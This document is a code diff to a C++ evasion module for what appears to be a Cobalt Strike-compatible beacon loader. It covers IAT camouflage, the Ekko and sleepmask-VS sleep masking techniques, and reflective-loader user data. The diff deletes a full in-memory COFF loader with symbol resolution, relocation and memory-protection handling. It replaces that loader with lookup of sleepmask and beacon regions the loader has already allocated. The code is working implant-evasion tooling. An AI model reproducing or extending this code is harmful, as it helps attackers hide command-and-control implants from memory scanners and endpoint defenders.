@@ -1,6 +1,5 @@
 #include <common.h>
 #include <module.h>
-#include <coff.h>
 
 using namespace stardust;
 
@@ -117,11 +116,9 @@ static auto declfn iat_camouflage( instance& inst ) -> void {
     inst.ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, reinterpret_cast<PVOID>( uAddress ) );
 }
 
-// ── Sleepmask-VS COFF loader + sleep ──
+// ── Sleepmask-VS sleep ──
 
 #if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
-
-#include <evasion/sleepmask_vs_data.h>
 
 // CS beacon.h 4.12 compatible types
 
@@ -356,311 +353,43 @@ static auto declfn sm_query_protection( instance& inst, PVOID addr ) -> DWORD {
     return mbi.Protect;
 }
 
-static BOOL __cdecl declfn sm_beacon_get_syscall_stub( void*, SIZE_T, BOOL ) {
-    return FALSE;
-}
-
-static char* __cdecl declfn sm_beacon_get_custom_user_data() {
-#ifdef _WIN64
-    void* result;
-    __asm__ volatile (
-        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
-        : "=a"(result)
-    );
-    auto inst = static_cast<instance*>( result );
-    if ( !inst || !inst->evasion.udrl_user_data ) return nullptr;
-    auto ud = reinterpret_cast<USER_DATA*>( inst->evasion.udrl_user_data );
-    return ud->custom;
-#else
-    return nullptr;
-#endif
-}
-
-static auto declfn sm_resolve_symbol(
-    instance& inst, const char* name
-) -> void* {
-    const char* n = name;
-    while ( n[0] == '_' && n[1] == '_' && n[2] == 'i' && n[3] == 'm' &&
-            n[4] == 'p' && n[5] == '_' )
-        n += 6;
-
-    char mod_name[64] = {};
-    char func_name[128] = {};
-
-    const char* dollar = n;
-    while ( *dollar && *dollar != '$' ) dollar++;
-
-    if ( *dollar == '$' ) {
-        uint32_t mod_len = (uint32_t)( dollar - n );
-        if ( mod_len < 59 ) {
-            memory::copy( mod_name, const_cast<char*>( n ), mod_len );
-            mod_name[mod_len] = '.'; mod_name[mod_len+1] = 'd';
-            mod_name[mod_len+2] = 'l'; mod_name[mod_len+3] = 'l';
-            mod_name[mod_len+4] = '\0';
-        }
-        auto fn = dollar + 1;
-        uint32_t fn_len = 0;
-        while ( fn[fn_len] ) fn_len++;
-        if ( fn_len < 127 )
-            memory::copy( func_name, const_cast<char*>( fn ), fn_len );
-
-        auto h_mod = inst.kernel32.LoadLibraryA( mod_name );
-        if ( h_mod ) {
-            auto addr = inst.kernel32.GetProcAddress( h_mod, func_name );
-            if ( addr ) return (void*)addr;
-        }
-    } else {
-        uint32_t h = 2166136261u;
-        for ( const char* p = n; *p; p++ ) {
-            uint8_t b = (uint8_t)*p;
-            if ( b >= 'a' ) b -= 0x20;
-            h ^= b; h *= 16777619u;
-        }
-        if ( h == expr::hash_string( "BeaconGetSyscallInformation" ) )
-            return (void*)sm_beacon_get_syscall_stub;
-        if ( h == expr::hash_string( "BeaconGetCustomUserData" ) )
-            return (void*)sm_beacon_get_custom_user_data;
-    }
-
-    DBG_PRINT( inst, "sm_coff: unresolved: %s\n", name );
-    return nullptr;
-}
-
-static auto declfn sm_compute_coff_text_size() -> uint32_t {
-    if ( SLEEPMASK_VS_COFF_SIZE < sizeof( COFF_FILE_HEADER ) )
-        return 0;
-
-    auto data = const_cast<uint8_t*>( SLEEPMASK_VS_COFF );
-    auto header = reinterpret_cast<COFF_FILE_HEADER*>( data );
-    auto sections = reinterpret_cast<COFF_SECTION*>(
-        data + sizeof( COFF_FILE_HEADER ) + header->SizeOfOptionalHeader );
-
-    uint32_t total = 0;
-    uint32_t text_end = 0;
-    uint16_t max_sec = header->NumberOfSections < 64 ? header->NumberOfSections : 64;
-
-    for ( uint16_t i = 0; i < max_sec; i++ ) {
-        uint32_t sz = sections[i].SizeOfRawData;
-        if ( sz == 0 ) sz = sections[i].VirtualSize;
-        if ( sz == 0 ) sz = 64;
-
-        if ( i > 0 && ( sections[i - 1].Characteristics & 0x20000000 ) &&
-             !( sections[i].Characteristics & 0x20000000 ) ) {
-            total = ( total + 0xFFF ) & ~0xFFFu;
-        }
-
-        uint32_t offset = total;
-        total += sz;
-
-        if ( sections[i].Characteristics & 0x20000000 ) {
-            uint32_t se = offset + sz;
-            if ( se > text_end ) text_end = se;
-        }
-    }
-
-    return text_end;
-}
-
-static auto declfn load_sleepmask_coff( instance& inst ) -> bool {
-    if ( SLEEPMASK_VS_COFF_SIZE < sizeof( COFF_FILE_HEADER ) ) {
-        DBG_PRINT( inst, "sleepmask-vs: no COFF data embedded\n" );
+static auto declfn init_sleepmask_vs_from_udrl( instance& inst ) -> bool {
+    if ( !inst.evasion.udrl_user_data ) {
+        DBG_PRINT( inst, "sleepmask-vs: no UDRL user data\n" );
         return false;
     }
 
-    auto data = const_cast<uint8_t*>( SLEEPMASK_VS_COFF );
-    auto header = reinterpret_cast<COFF_FILE_HEADER*>( data );
-    auto sections = reinterpret_cast<COFF_SECTION*>(
-        data + sizeof( COFF_FILE_HEADER ) + header->SizeOfOptionalHeader );
-    auto symbols = reinterpret_cast<COFF_SYMBOL*>(
-        data + header->PointerToSymbolTable );
-    auto string_table = reinterpret_cast<char*>( symbols + header->NumberOfSymbols );
-
-    auto section_ptrs = static_cast<uint8_t**>(
-        inst.heap_alloc( header->NumberOfSections * sizeof( uint8_t* ) ) );
-    if ( !section_ptrs ) return false;
-
-    uint32_t total_alloc = 0;
-    uint32_t sec_offsets[64] = {};
-    uint32_t sec_sizes[64] = {};
-    uint16_t max_sec = header->NumberOfSections < 64 ? header->NumberOfSections : 64;
-
-    for ( uint16_t i = 0; i < max_sec; i++ ) {
-        sec_sizes[i] = sections[i].SizeOfRawData;
-        if ( sec_sizes[i] == 0 ) sec_sizes[i] = sections[i].VirtualSize;
-        if ( sec_sizes[i] == 0 ) sec_sizes[i] = 64;
-
-        if ( i > 0 && ( sections[i - 1].Characteristics & 0x20000000 ) &&
-             !( sections[i].Characteristics & 0x20000000 ) ) {
-            total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
-        }
-
-        sec_offsets[i] = total_alloc;
-        total_alloc += ( sec_sizes[i] + 15 ) & ~15u;
-    }
-    total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
-    uint32_t tramp_offset = total_alloc;
-    total_alloc += header->NumberOfSymbols * 12;
-    uint32_t imp_offset = ( total_alloc + 7 ) & ~7u;
-    total_alloc = imp_offset + header->NumberOfSymbols * sizeof( void* );
-
-    auto coff_base = static_cast<uint8_t*>(
-        inst.kernel32.VirtualAlloc(
-            nullptr, total_alloc,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
-    if ( !coff_base ) {
-        inst.heap_free( section_ptrs );
+    auto ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
+    if ( !ud->allocatedMemory ) {
+        DBG_PRINT( inst, "sleepmask-vs: no allocated memory\n" );
         return false;
     }
 
-    for ( uint16_t i = 0; i < max_sec; i++ ) {
-        section_ptrs[i] = coff_base + sec_offsets[i];
-        if ( sections[i].SizeOfRawData > 0 )
-            memory::copy( section_ptrs[i],
-                data + sections[i].PointerToRawData,
-                sections[i].SizeOfRawData );
-    }
+    for ( int i = 0; i < 6; i++ ) {
+        auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[i];
+        if ( reg.Purpose != PURPOSE_SLEEPMASK_MEMORY || !reg.AllocationBase )
+            continue;
 
-    auto tramp_ptr = coff_base + tramp_offset;
-    uint32_t tramp_used = 0;
-    auto imp_table = reinterpret_cast<void**>( coff_base + imp_offset );
-
-    auto func_ptrs = static_cast<void**>(
-        inst.heap_alloc( header->NumberOfSymbols * sizeof( void* ) ) );
-    if ( !func_ptrs ) {
-        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
-        inst.heap_free( section_ptrs );
-        return false;
-    }
-    memory::zero( func_ptrs, header->NumberOfSymbols * sizeof( void* ) );
-
-    void* entry_ptr = nullptr;
-
-    for ( uint32_t i = 0; i < header->NumberOfSymbols; i++ ) {
-        char sym_name[256] = {};
-        if ( symbols[i].Name.Zeroes == 0 ) {
-            auto long_name = string_table + symbols[i].Name.Offset;
-            uint32_t nlen = 0;
-            while ( long_name[nlen] && nlen < 255 ) nlen++;
-            memory::copy( sym_name, long_name, nlen );
-        } else {
-            memory::copy( sym_name, symbols[i].ShortName, 8 );
+        void* entry = reg.Sections[1].BaseAddress;
+        if ( !entry ) {
+            DBG_PRINT( inst, "sleepmask-vs: no mask entry in Section[1]\n" );
+            return false;
         }
 
-        if ( symbols[i].SectionNumber > 0 ) {
-            uint16_t sec_idx = symbols[i].SectionNumber - 1;
-            if ( sec_idx < max_sec )
-                func_ptrs[i] = section_ptrs[sec_idx] + symbols[i].Value;
+        inst.evasion.sleepmask_vs.code_base = reg.AllocationBase;
+        inst.evasion.sleepmask_vs.code_size = static_cast<uint32_t>( reg.RegionSize );
+        inst.evasion.sleepmask_vs.entry     = entry;
+        inst.evasion.sleepmask_vs.loaded    = true;
+        inst.evasion.sleepmask_vs_text_size = static_cast<uint32_t>( reg.Sections[1].VirtualSize );
 
-            if ( ( sym_name[0] == 's' && sym_name[1] == 'l' && sym_name[2] == 'e' &&
-                   sym_name[3] == 'e' && sym_name[4] == 'p' && sym_name[5] == '_' &&
-                   sym_name[6] == 'm' && sym_name[7] == 'a' && sym_name[8] == 's' &&
-                   sym_name[9] == 'k' && sym_name[10] == '\0' ) ||
-                 ( sym_name[0] == '_' && sym_name[1] == 's' && sym_name[2] == 'l' &&
-                   sym_name[3] == 'e' && sym_name[4] == 'e' && sym_name[5] == 'p' &&
-                   sym_name[6] == '_' && sym_name[7] == 'm' && sym_name[8] == 'a' &&
-                   sym_name[9] == 's' && sym_name[10] == 'k' && sym_name[11] == '\0' ) ) {
-                entry_ptr = func_ptrs[i];
-            }
-        } else if ( symbols[i].SectionNumber == 0 && symbols[i].StorageClass == 2 ) {
-            bool is_imp = sym_name[0] == '_' && sym_name[1] == '_' &&
-                          sym_name[2] == 'i' && sym_name[3] == 'm' &&
-                          sym_name[4] == 'p' && sym_name[5] == '_';
-            void* resolved = sm_resolve_symbol( inst, sym_name );
-            if ( is_imp && resolved ) {
-                imp_table[i] = resolved;
-                func_ptrs[i] = &imp_table[i];
-            } else if ( resolved ) {
-                auto t = tramp_ptr + tramp_used * 12;
-                t[0] = 0x48; t[1] = 0xB8;
-                *reinterpret_cast<uint64_t*>( t + 2 ) =
-                    reinterpret_cast<uint64_t>( resolved );
-                t[10] = 0xFF; t[11] = 0xE0;
-                func_ptrs[i] = t;
-                tramp_used++;
-            }
-        }
-
-        i += symbols[i].NumberOfAuxSymbols;
+        DBG_PRINT( inst, "sleepmask-vs: from UDRL, entry=%p, base=%p, size=%u, text=%u\n",
+            entry, reg.AllocationBase, inst.evasion.sleepmask_vs.code_size,
+            inst.evasion.sleepmask_vs_text_size );
+        return true;
     }
 
-    if ( !entry_ptr ) {
-        DBG_PRINT( inst, "sleepmask-vs: entry 'sleep_mask' not found\n" );
-        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
-        inst.heap_free( section_ptrs );
-        inst.heap_free( func_ptrs );
-        return false;
-    }
-
-    for ( uint16_t s = 0; s < max_sec; s++ ) {
-        if ( sections[s].NumberOfRelocations == 0 ) continue;
-        auto relocs = reinterpret_cast<COFF_RELOCATION*>(
-            data + sections[s].PointerToRelocations );
-        for ( uint16_t r = 0; r < sections[s].NumberOfRelocations; r++ ) {
-            uint32_t sym_idx = relocs[r].SymbolTableIndex;
-            auto target = section_ptrs[s] + relocs[r].VirtualAddress;
-            uintptr_t sym_addr = reinterpret_cast<uintptr_t>( func_ptrs[sym_idx] );
-            if ( !sym_addr ) continue;
-
-            switch ( relocs[r].Type ) {
-                case IMAGE_REL_AMD64_ADDR64:
-                    *reinterpret_cast<uint64_t*>( target ) += sym_addr;
-                    break;
-                case IMAGE_REL_AMD64_ADDR32NB:
-                    *reinterpret_cast<uint32_t*>( target ) += static_cast<uint32_t>(
-                        sym_addr - reinterpret_cast<uintptr_t>( coff_base ) );
-                    break;
-                case IMAGE_REL_AMD64_REL32:
-                    *reinterpret_cast<int32_t*>( target ) +=
-                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 4 );
-                    break;
-                case IMAGE_REL_AMD64_REL32_1:
-                    *reinterpret_cast<int32_t*>( target ) +=
-                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 5 );
-                    break;
-                case IMAGE_REL_AMD64_REL32_2:
-                    *reinterpret_cast<int32_t*>( target ) +=
-                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 6 );
-                    break;
-                case IMAGE_REL_AMD64_REL32_3:
-                    *reinterpret_cast<int32_t*>( target ) +=
-                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 7 );
-                    break;
-                case IMAGE_REL_AMD64_REL32_4:
-                    *reinterpret_cast<int32_t*>( target ) +=
-                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 8 );
-                    break;
-                case IMAGE_REL_AMD64_REL32_5:
-                    *reinterpret_cast<int32_t*>( target ) +=
-                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 9 );
-                    break;
-            }
-        }
-    }
-
-    for ( uint16_t i = 0; i < max_sec; i++ ) {
-        if ( sections[i].Characteristics & 0x20000000 ) {
-            DWORD old_protect;
-            inst.kernel32.VirtualProtect( section_ptrs[i], sec_sizes[i],
-                PAGE_EXECUTE_READ, &old_protect );
-        }
-    }
-    if ( tramp_used > 0 ) {
-        DWORD old_protect;
-        inst.kernel32.VirtualProtect( tramp_ptr, tramp_used * 12,
-            PAGE_EXECUTE_READ, &old_protect );
-    }
-
-    inst.evasion.sleepmask_vs.code_base = coff_base;
-    inst.evasion.sleepmask_vs.code_size = total_alloc;
-    inst.evasion.sleepmask_vs.entry     = entry_ptr;
-    inst.evasion.sleepmask_vs.loaded    = true;
-
-    inst.heap_free( section_ptrs );
-    inst.heap_free( func_ptrs );
-
-    DBG_PRINT( inst, "sleepmask-vs: loaded, entry=%p, text=%u, total=%u\n",
-        entry_ptr, sm_compute_coff_text_size(), total_alloc );
-    return true;
+    DBG_PRINT( inst, "sleepmask-vs: no sleepmask memory region\n" );
+    return false;
 }
 
 static auto declfn build_beacon_info(
@@ -671,7 +400,7 @@ static auto declfn build_beacon_info(
 
     info.version = 0x041200;
     info.sleep_mask_ptr = reinterpret_cast<char*>( inst.evasion.sleepmask_vs.code_base );
-    info.sleep_mask_text_size = sm_compute_coff_text_size();
+    info.sleep_mask_text_size = inst.evasion.sleepmask_vs_text_size;
     info.sleep_mask_total_size = inst.evasion.sleepmask_vs.code_size;
 
     uintptr_t beacon_base = 0;
@@ -681,10 +410,13 @@ static auto declfn build_beacon_info(
     if ( inst.evasion.udrl_user_data ) {
         ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
         if ( ud->allocatedMemory ) {
-            auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[0];
-            if ( reg.AllocationBase ) {
-                beacon_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
-                beacon_size = static_cast<uint32_t>( reg.RegionSize );
+            for ( int ri = 0; ri < 6; ri++ ) {
+                auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[ri];
+                if ( reg.Purpose == PURPOSE_BEACON_MEMORY && reg.AllocationBase ) {
+                    beacon_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
+                    beacon_size = static_cast<uint32_t>( reg.RegionSize );
+                    break;
+                }
             }
         }
     }
@@ -777,7 +509,7 @@ auto declfn evasion_on_init( instance& inst ) -> void {
 #endif
 
 #if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
-    load_sleepmask_coff( inst );
+    init_sleepmask_vs_from_udrl( inst );
 #endif
 }
 
@@ -792,8 +524,7 @@ auto declfn evasion_on_cleanup( instance& inst ) -> void {
     inst.evasion.ekko.initialized = false;
 
 #if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
-    if ( inst.evasion.sleepmask_vs.code_base ) {
-        inst.kernel32.VirtualFree( inst.evasion.sleepmask_vs.code_base, 0, MEM_RELEASE );
+    if ( inst.evasion.sleepmask_vs.loaded ) {
         inst.evasion.sleepmask_vs = {};
     }
 #endif
@@ -1052,10 +783,14 @@ auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> v
         if ( inst.evasion.udrl_user_data ) {
             auto ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
             if ( ud->allocatedMemory ) {
-                auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[0];
-                if ( reg.AllocationBase && reg.RegionSize ) {
-                    img_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
-                    img_size = static_cast<uint32_t>( reg.RegionSize );
+                for ( int ri = 0; ri < 6; ri++ ) {
+                    auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[ri];
+                    if ( reg.Purpose == PURPOSE_BEACON_MEMORY &&
+                         reg.AllocationBase && reg.RegionSize ) {
+                        img_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
+                        img_size = static_cast<uint32_t>( reg.RegionSize );
+                        break;
+                    }
                 }
             }
         }
